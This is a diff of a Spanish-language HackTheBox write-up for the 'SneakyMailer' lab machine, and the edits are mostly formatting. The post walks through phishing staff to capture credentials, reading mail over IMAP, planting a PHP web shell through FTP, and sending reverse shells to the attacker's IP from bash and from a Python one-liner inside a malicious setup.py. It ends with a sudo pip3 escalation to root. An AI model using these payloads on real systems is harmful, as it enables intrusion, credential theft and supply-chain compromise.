@@ -1,8 +1,10 @@
 ---
 layout      : post
 title       : "HackTheBox - SneakyMailer"
+author      : lanz
 image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sneakymailer/bannersneakymailer.png
 category    : [ htb ]
+tags        : [ phishing, FTP, PyPi, RCE, sudo ]
 ---
 Máquina Linux nivel medio pero que de medio muy poco, o pues casi me enloquezco :P SneakyMailer... Vaya locura, jugaremos simulando phishing, explotaremos cositas de FTP, romperemos PyPi para crearnos un paquete malicioso y generar ejecución remota de comandos y trolearemos un poco con los permisos de usuario.
 
@@ -26,21 +28,21 @@ Este writeup va a ser largo :P
 
 ### Fases
 
-1. [Enumeración](#enumeración)
-2. [Explotación](#explotación)
+1. [Enumeración](#enumeracion)
+2. [Explotación](#explotacion)
 3. [Escalada de privilegios](#escalada-de-privilegios)
 
 ...
 
-## Enumeración [#](#enumeración) {#enumeración}
+## Enumeración [#](#enumeracion) {#enumeracion}
 
-```sh
+```bash
 –» nmap -p- --open -v -n 10.10.10.197
 ```
 
 Pero va lento, agregando `-T` va más rápido. (Sin embargo es importante hacer un escaneo total, sin cambios, así vaya lento, que nos permita ver si `-T` obvia/pasa algún puerto.
 
-```sh
+```bash
 –» nmap -p- --open -T5 -v -n 10.10.10.197 -oG initScan
 ```
 
@@ -53,7 +55,7 @@ Pero va lento, agregando `-T` va más rápido. (Sin embargo es importante hacer 
 | -v         | Permite ver en consola lo que va encontrando                                                             |
 | -oG        | Guarda el output en formato grepeable (para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos)                  |
 
-```sh
+```bash
 –» cat initScan 
 # Nmap 7.80 scan initiated Tue Oct 13 25:25:25 2020 as: nmap -p- --open -T5 -v -n -oG initScan 10.10.10.197
 # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
@@ -73,7 +75,7 @@ Obtenemos los puertos:
 
 Procedemos a nuestro escaneo de versiones y scripts.
 
-```sh
+```bash
 –» nmap -p 21,22,25,80,143,993,8080 -sC -sV 10.10.10.197 -oN portScan
 ```
 
@@ -84,7 +86,7 @@ Procedemos a nuestro escaneo de versiones y scripts.
 | -sV       | Nos permite ver la versión del servicio                |
 | -oN       | Guarda el output en un archivo                         |
 
-```sh
+```bash
 –» cat portScan 
 # Nmap 7.80 scan initiated Tue Oct 13 25:25:25 2020 as: nmap -p21,22,25,80,143,993,8080 -sC -sV -oN portScan 10.10.10.197
 Nmap scan report for 10.10.10.197
@@ -136,7 +138,7 @@ Perfecto, veamos que tenemos:
 
 Agregamos `sneakycorp.htb` al archivo `/etc/hosts`
 
-```sh
+```bash
 –» cat /etc/hosts
 127.0.0.1       localhost
 10.10.10.197  sneakycorp.htb
@@ -154,7 +156,7 @@ Tenemos un apartado **Team** en la parte izquierda, veamos:
 
 Interesante, tenemos también posibles usuarios junto a los correos, juguemos con **curL** y **grep** para extraernos los correos y usuarios en archivos.
 
-```sh
+```bash
 –» curl -s http://sneakycorp.htb/team.php | grep -oP "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" > emails.txt
 –» cat emails.txt 
 tigernixon@sneakymailer.htb
@@ -177,7 +179,7 @@ ashtoncox@sneakymailer.htb
 
 Podemos usar el archivo de `emails.txt` para extraer los usuarios, se puede hacer de varias formas:
 
-```sh
+```bash
 –» cat emails.txt | tr '@' ' ' | awk '{print $1}' > users.txt
 –» cat users.txt  
 tigernixon
@@ -212,15 +214,15 @@ El display por default, veamos si podemos encontrar algo más usando **wfuzz**..
 
 Bueno, realmente el inicio de esta máquina me estaba matando, literalmente no entendía nada de lo que debía hacer o tenía ideas claramente erróneas. Lo más óptimo y necesario fue pedir ayuda, primero me fui para el [foro](https://forum.hackthebox.eu/discussion/3564/official-sneakymailer-discussion/p1) oficial de la máquina, varios hacían caer en cuenta sobre que sería lo primero en probar al tener tantos correos... Hablaban de enviar <<algo>> a cada usuario y estar "atento"...
 
-Realmente estaba muy confundido, encontré herramientas para enviar correo, probé enviar los mails y esperar alguna respuesta en el mail temporal que estaba usando, pero nada, no entendía que debía esperar o como... Decidí preguntarle a [**TazWake**](https://www.hackthebox.eu/profile/49335) que es moderador y Omniscient en hackthebox, además de ser una persona superpuesta a ayudar y todo un master.
+Realmente estaba muy confundido, encontré herramientas para enviar correo, probé enviar los mails y esperar alguna respuesta en el mail temporal que estaba usando, pero nada, no entendía que debía esperar o como... Decidí preguntarle a [TazWake](https://www.hackthebox.eu/profile/49335) que es moderador y Omniscient en hackthebox, además de ser una persona superpuesta a ayudar y todo un master.
 
 **Thank you TazWake**.
 
-## Explotación [#](#explotación) {#explotación}
+## Explotación [#](#explotacion) {#explotacion}
 
 Resulta que la idea estaba medianamente bien, si bien debemos enviar emails a cada usuario, en el proceso uno de ellos nos va a responder con "algo"... Pero debemos estar en escucha en nuestra máquina, ósea levantar un servidor web en el que estemos pendientes de sí alguno de ellos intenta entrar y ver que obtenemos... Esto me rompió la cabeza, ya que me parece superloco y supernuevo.
 
-Buscando por internet una de las herramientas que encontré fue [`swaks`](http://www.jetmore.org/john/code/swaks/), el cual nos va a ayudar a enviar los emails con toda la info y el body (en el cual pondremos el link del servidor web que montamos).
+Buscando por internet una de las herramientas que encontré fue [swaks](http://www.jetmore.org/john/code/swaks/), el cual nos va a ayudar a enviar los emails con toda la info y el body (en el cual pondremos el link del servidor web que montamos).
 
 Los pasos que hice fueron estos:
 
@@ -239,7 +241,7 @@ QUE LOCURAAAAAAAAAAAAAAAAAA. Me encanto, pero me exploto la cabeza :o Sigamos...
 
 Si quitamos el URLencode realizado obtenemos esto:
 
-```
+```bash
 # Original output
 firstName=Paul
 lastName=Byrd
@@ -259,7 +261,7 @@ rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
 
 Inicialmente intente entrar a **SSH** y **FTP** con esas credenciales, pero no fue posible. Así que nos queda revisar si podemos entrar al email por medio de **imap**.
 
-```sh
+```bash
 # Por medio del puerto seguro 
 –» openssl s_client -connect 10.10.10.197:993
 
@@ -270,7 +272,7 @@ Inicialmente intente entrar a **SSH** y **FTP** con esas credenciales, pero no f
 
 Estando dentro podemos logearnos con las credenciales encontradas
 
-```
+```bash
 A1 LOGIN paulbyrd "^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht"
 * OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)
 A1 OK LOGIN Ok.
@@ -280,7 +282,7 @@ A1 OK LOGIN Ok.
 
 Listemos los buzones:
 
-```
+```bash
 A1 LIST "" *
 * LIST (\Unmarked \HasChildren) "." "INBOX"
 * LIST (\HasNoChildren) "." "INBOX.Trash"
@@ -292,7 +294,7 @@ A1 OK LIST completed
 
 Veamos cuantos mails hay en cada buzón:
 
-```sh
+```bash
 A1 STATUS INBOX (MESSAGES)
 * STATUS "INBOX" (MESSAGES 0)
 A1 OK STATUS Completed.
@@ -312,7 +314,7 @@ A1 OK STATUS Completed.
 
 Vemos en el buzón `INBOX.Sent Items` que hay 2 correos enviados, enfoquémonos en eso:
 
-```
+```bash
 A1 SELECT "INBOX.Sent Items"
 * FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
 * OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited
@@ -325,7 +327,7 @@ A1 OK [READ-WRITE] Ok
 
 Podemos ver el header de los dos correos de la siguiente forma:
 
-```
+```bash
 A1 FETCH 1:2 (BODY[HEADER])
 * 1 FETCH (BODY[HEADER] {279}
 MIME-Version: 1.0
@@ -358,7 +360,7 @@ A1 OK FETCH completed.
 
 Vemos en uno de ellos el asunto: **Password reset**. Seguimos, veamos el contenido de cada email:
 
-```
+```bash
 A1 FETCH 1 (BODY)
 * 1 FETCH (BODY (("text" "plain" ("charset" "utf-8") NIL NIL "quoted-printable" 196 7)("text" "html" ("charset" "utf-8") NIL NIL "quoted-printable" 1381 32) "alternative"))
 A1 OK FETCH completed.
@@ -371,7 +373,7 @@ Cuando hacemos el `BODY` el mensaje usualmente está dividido en partes:
 
 Démosle:
 
-```
+```bash
 A1 FETCH 1 (BODY[1])
 * 1 FETCH (BODY[1] {196}
 Hello administrator, I want to change this password for the developer accou=
@@ -402,7 +404,7 @@ Bueno obtenemos nuevas credenciales que probablemente nos sirvan (como pueda que
 
 Veamos el segundo correo:
 
-```
+```bash
 A1 FETCH 2 (BODY)
 * 2 FETCH (BODY ("text" "plain" ("charset" "utf-8" "format" "flowed") NIL NIL "7bit" 166 6))
 A1 OK FETCH completed.
@@ -429,9 +431,9 @@ Listo, ya vimos todo lo que podíamos obtener del correo dé `paulbyrd`.
 
 Los comandos e información sobre **imap** los obtuve de estos recursos:
 
-* [telnet-imap-commands-note](https://busylog.net/telnet-imap-commands-note/)
-* [access-imap-server-from-the-command-line-using-openssh](https://tewarid.github.io/2011/05/10/access-imap-server-from-the-command-line-using-openssl.html)
-* [hacktricks.xyz-pentesting-imap](https://book.hacktricks.xyz/pentesting/pentesting-imap#syntax)
+* [telnet-imap-commands-note](https://busylog.net/telnet-imap-commands-note/).
+* [access-imap-server-from-the-command-line-using-openssh](https://tewarid.github.io/2011/05/10/access-imap-server-from-the-command-line-using-openssl.html).
+* [hacktricks.xyz-pentesting-imap](https://book.hacktricks.xyz/pentesting/pentesting-imap#syntax).
 
 #### > Puerto 21 (FTP)
 
@@ -445,7 +447,7 @@ De los archivos montados no hay nada interesante, vemos que estamos sobre el ser
 
 Cuando estuve en el foro una persona escribió que el vhost es importante. Así que me quedo la duda y buscando por internet que herramienta puede ayudarnos, usaremos [gobuster](https://github.com/OJ/gobuster) la cual hace un fuzzing de Virtual Hosting sobre el servicio:
 
-```sh
+```bash
 –» gobuster vhost -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://sneakycorp.htb
 ===============================================================
 Gobuster v3.0.1
@@ -470,7 +472,7 @@ Found: .htm..sneakycorp.htb (Status: 400) [Size: 173]
 
 Encontramos un nuevo dominio: `dev.sneakycorp.htb`, pongámoslo en el `/etc/hosts` y veamos que hay:
 
-```sh
+```bash
 –» cat /etc/hosts
 127.0.0.1       localhost
 10.10.10.197  sneakycorp.htb
@@ -491,7 +493,7 @@ Listo, lo que nos queda es saber que "módulos" o "paquetes" de Python podemos s
 
 Testeando algunas cosas vi que nos deja crear carpetas, pero no nos deja listar su contenido:
 
-```
+```bash
 ftp> cd dev
 250 Directory successfully changed.
 ftp> mkdir t3s7_h78
@@ -535,7 +537,7 @@ Revisemos la web:
 
 Hagámosla más sencilla, montemos el archivo en la raíz:
 
-```
+```bash
 ftp> cd dev                                                          
 250 Directory successfully changed.
 ftp> put jay.txt
@@ -549,21 +551,21 @@ ftp>
 
 Validemos:
 
-```sh
+```bash
 –» curl -s http://dev.sneakycorp.htb/jay.txt
 hola
 ```
 
 Perfecto, intentemos hacer ejecución de comandos remotamente:
 
-```sh
+```bash
 –» cat locurasdices.php 
 <?php $out=shell_exec($_GET['xmd']); echo $out; ?>
 ```
 
 Y subámoslo:
 
-```
+```bash
 ftp> put locurasdices.php
 local: locurasdices.php remote: locurasdices.php
 200 PORT command successful. Consider using PASV.
@@ -575,24 +577,24 @@ ftp>
 
 Validamos:
 
-```sh
+```bash
 –» curl -s http://dev.sneakycorp.htb/locurasdices.php?xmd=whoami
 www-data
 ```
 
 Listo, tenemos ejecución de comandos en el sistema, generemos una reverse Shell, nos ponemos en escucha:
 
-```sh
+```bash
 –» nc -nvlp 4433
 ```
 
-```sh
+```bash
 –» curl -s http://dev.sneakycorp.htb/locurasdices.php?xmd=bash -c 'bash -i >& /dev/tcp/10.10.15.86/4433 0>&1'
 ```
 
 Pero no sucede nada, pasémosla a [URLencode](https://www.urlencoder.org/):
 
-```sh
+```bash
 –» curl -s http://dev.sneakycorp.htb/locurasdices.php?xmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.86%2F4433%200%3E%261%27
 ```
 
@@ -602,7 +604,7 @@ PERFECTO, sigamos enumerando.
 
 Vemos varias cositas:
 
-```sh
+```bash
 www-data@sneakymailer:~$ cat /etc/passwd
 cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -660,7 +662,7 @@ Validando el dominio en la web nos redirecciona al host principal, pero si lo pr
 
 Volvamos a la consola, migrémonos a `developer` usando la pw de **FTP** y busquemos algo relacionado a credenciales.
 
-```sh
+```bash
 developer@sneakymailer:~/pypi.sneakycorp.htb$ ls -la
 ls -la
 total 20
@@ -680,11 +682,11 @@ Obtenemos un hash **Apache $apr1$ MD5, md5apr1, MD5 (APR) 2**. vamos a crackearl
 
 > **.htpasswd** es una utilidad que tiene por función almacenar contraseñas de forma cifrada para ser utilizadas por Apache en servicios de autenticación. [Desde Linux](https://blog.desdelinux.net/como-proteger-nuestros-sitios-usando-htpasswd-ejemplos/)
 
-* [Gran artículo explicando como funciona el archivo **.htpasswd**](https://blog.desdelinux.net/como-proteger-nuestros-sitios-usando-htpasswd-ejemplos/)
+* [Gran artículo explicando como funciona el archivo **.htpasswd**](https://blog.desdelinux.net/como-proteger-nuestros-sitios-usando-htpasswd-ejemplos/).
 
 Usando `john-the-ripper` logramos el objetivo:
 
-```sh
+```bash
 –» john --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hashpypi 
 Using default input encoding: UTF-8
 Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
@@ -705,8 +707,8 @@ Bueno, con base en lo que nos muestra `http://pypi.sneakycorp.htb:8080/` nos da 
 
 Buscando en internet sobre maneras de explotar PyPI y sus paquetes, encontré unos retos tipo CTF para aprender sobre el tema, acá se los dejo:
 
-* [Python PyPI Challenges](https://attackdefense.com/listingnoauth?labtype=code-repos&subtype=code-repos-pypi)
-* [Articulo de un investigador que ha encontrado varios paquetes maliciosos sobre PyPI](https://medium.com/@bertusk/detecting-cyber-attacks-in-the-python-package-index-pypi-61ab2b585c67)
+* [Python PyPI Challenges](https://attackdefense.com/listingnoauth?labtype=code-repos&subtype=code-repos-pypi).
+* [Articulo de un investigador que ha encontrado varios paquetes maliciosos sobre PyPI](https://medium.com/@bertusk/detecting-cyber-attacks-in-the-python-package-index-pypi-61ab2b585c67).
 
 ...
 
@@ -714,7 +716,7 @@ Esta máquina me desquicio, pero fue muy divertida e interesante... Acá me esta
 
 Siguiendo esta guía, genere la estructura inicial.
 
-* [Packaging tutorial python.org](https://packaging.python.org/tutorials/packaging-projects/)
+* [Packaging tutorial python.org](https://packaging.python.org/tutorials/packaging-projects/).
 
 Primero monte todo en mi máquina y cuando ya posiblemente tuviera todo bien lo pasaría a la máquina víctima.
 
@@ -722,9 +724,9 @@ Lo importante será crear nuestro `setup.py` que será el que contendrá la info
 
 De manera sencilla podemos decirle al script que nos genere una reverse Shell (que si traemos el recuerdo de los mails, sabemos que las tareas sobre paquetes son llevadas a cabo por `low`, por lo tanto obtendremos una sesión como el), yo tome la clásica de Python:
 
-* [Reverse shells cheat sheet](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/)
+* [Reverse shells cheat sheet](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/).
 
-```py
+```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
@@ -768,18 +770,18 @@ setup(
 
 Para la estructura y entendimiento me base en estos paquetes:
 
-* [Ayrx + malicious-python-package](https://github.com/Ayrx/malicious-python-package/blob/master/setup.py)
-* [mschwager + 0wned-package](https://github.com/mschwager/0wned/blob/master/setup.py)
+* [Ayrx + malicious-python-package](https://github.com/Ayrx/malicious-python-package/blob/master/setup.py).
+* [mschwager + 0wned-package](https://github.com/mschwager/0wned/blob/master/setup.py).
 
 Teniendo nuestro código malicioso lo que nos queda es ejecutarlo desde la máquina víctima, ponernos en escucha y obtener la reverse Shell por el puerto **4444**. Para ello usamos:
 
-```sh
+```bash
 –» python3 setup.py sdist
 ```
 
 El cual nos genera el siguiente árbol de objetos.
 
-```sh
+```bash
 –» tree -a
 .
 ├── dist
@@ -801,7 +803,7 @@ En este punto cuando subía `setup.py` a la máquina e intentaba ejecutarlo no p
 
 Me indico que lo óptimo es crear un archivo `.pypirc` el cual contenga unas credenciales (las de **pypi** que ya encontramos) y un repositorio al cual se van a subir los objetos, así `setup.py` sabe a donde apuntar, este sería nuestro archivo `.pypirc` (que debe ser alojado en el `$HOME`).
 
-```sh
+```bash
 –» cat .pypirc 
 [distutils]
 index-servers =
@@ -815,7 +817,7 @@ password: soufianeelhaoui
 
 Y en nuestra ejecución anterior agregaremos:
 
-```sh
+```bash
 –» python3 setup.py sdist register -r locuras upload -r locuras
 ```
 
@@ -823,7 +825,7 @@ Vamos a la máquina víctima, subimos el nuevo `setup.py`, subimos `.pypirc`, in
 
 :( Obtenemos este error:
 
-```sh
+```bash
 ...
   File "/usr/lib/python3.7/distutils/command/register.py", line 80, in _set_config
     raise ValueError('%s not found in .pypirc' % self.repository)
@@ -832,7 +834,7 @@ ValueError: locuras not found in .pypirc
 
 Como sabemos el archivo debe estar en la ruta `$HOME`, validemos que ruta tenemos y si podemos escribir sobre ella
 
-```sh
+```bash
 developer@sneakymailer:/dev/shm$ echo $HOME
 echo $HOME
 /var/www/dev.sneakycorp.htb
@@ -844,7 +846,7 @@ developer@sneakymailer:/dev/shm$
 
 Pues no, no tenemos permiso, juguemos con las variables del entorno y digámosle que tome `/dev/shm` como `$HOME` por un momento y después lo dejamos como estaba :P
 
-```sh
+```bash
 developer@sneakymailer:/dev/shm$ ORIGINALhome=$HOME
 ORIGINALhome=$HOME
 developer@sneakymailer:/dev/shm$ echo $ORIGINALhome
@@ -860,7 +862,7 @@ developer@sneakymailer:~$
 
 Listo, ejecutemos y veamos:
 
-```sh
+```bash
 –» python3 setup.py sdist register -r locuras upload -r locuras
 ```
 
@@ -869,7 +871,7 @@ Listo, ejecutemos y veamos:
 SI SEÑOOOOOOOR!!! Obtenemos nuestra reverse Shell, que maravilla y que locura... (Estuve mis buenos días dándole a esto) 
 Dejamos la variable `$HOME` como estaba:
 
-```sh
+```bash
 developer@sneakymailer:~$ echo $HOME
 echo $HOME
 /dev/shm
@@ -883,13 +885,13 @@ developer@sneakymailer:/dev/shm$
 
 Algunos recursos útiles en el proceso:
 
-* [https://dzone.com/articles/executable-package-pip-install](https://dzone.com/articles/executable-package-pip-install)
-* [https://gist.github.com/wjladams/f00d6c590a4384ad2a92bf9c53f6b794](https://gist.github.com/wjladams/f00d6c590a4384ad2a92bf9c53f6b794)
-* [https://medium.com/@joel.barmettler/how-to-upload-your-python-package-to-pypi-65edc5fe9c56](https://medium.com/@joel.barmettler/how-to-upload-your-python-package-to-pypi-65edc5fe9c56)
-* [https://packaging.python.org/tutorials/packaging-projects/](https://packaging.python.org/tutorials/packaging-projects/)
-* [https://docs.python.org/3.3/distutils/packageindex.html](https://docs.python.org/3.3/distutils/packageindex.html)
-* [https://the-hitchhikers-guide-to-packaging.readthedocs.io/en/latest/contributing.html](https://the-hitchhikers-guide-to-packaging.readthedocs.io/en/latest/contributing.html)
-* [https://packaging.python.org/specifications/pypirc/](https://packaging.python.org/specifications/pypirc/)
+* [https://dzone.com/articles/executable-package-pip-install](https://dzone.com/articles/executable-package-pip-install).
+* [https://gist.github.com/wjladams/f00d6c590a4384ad2a92bf9c53f6b794](https://gist.github.com/wjladams/f00d6c590a4384ad2a92bf9c53f6b794).
+* [https://medium.com/@joel.barmettler/how-to-upload-your-python-package-to-pypi-65edc5fe9c56](https://medium.com/@joel.barmettler/how-to-upload-your-python-package-to-pypi-65edc5fe9c56).
+* [https://packaging.python.org/tutorials/packaging-projects/](https://packaging.python.org/tutorials/packaging-projects/).
+* [https://docs.python.org/3.3/distutils/packageindex.html](https://docs.python.org/3.3/distutils/packageindex.html).
+* [https://the-hitchhikers-guide-to-packaging.readthedocs.io/en/latest/contributing.html](https://the-hitchhikers-guide-to-packaging.readthedocs.io/en/latest/contributing.html).
+* [https://packaging.python.org/specifications/pypirc/](https://packaging.python.org/specifications/pypirc/).
 
 ...
 
@@ -897,7 +899,7 @@ Algunos recursos útiles en el proceso:
 
 Si vemos que puede ejecutar `low` como `root` mediante **sudo** vemos `pip3` y que no nos pedirá contraseña.
 
-```sh
+```bash
 low@sneakymailer:~$ sudo -l
 sudo -l
 sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
@@ -912,9 +914,9 @@ low@sneakymailer:~$
 
 Si hacemos una búsqueda rápida en internet, podemos conseguir una Shell indicándole a `pip3` que instale un paquete temporal, el cual simplemente hace eso, darnos una Shell, pero como el binario puede ser ejecutado con permisos de administrador, usaremos eso para obtener una sesión como el usuario administrador :)
 
-* [Info de como conseguir la Shell mediante pip](https://gtfobins.github.io/gtfobins/pip/)
+* [Info de como conseguir la Shell mediante pip](https://gtfobins.github.io/gtfobins/pip/).
 
-```sh
+```bash
 low@sneakymailer:~$ TF=$(mktemp -d)
 low@sneakymailer:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
 low@sneakymailer:~$ sudo usr/bin/pip3 install $TF
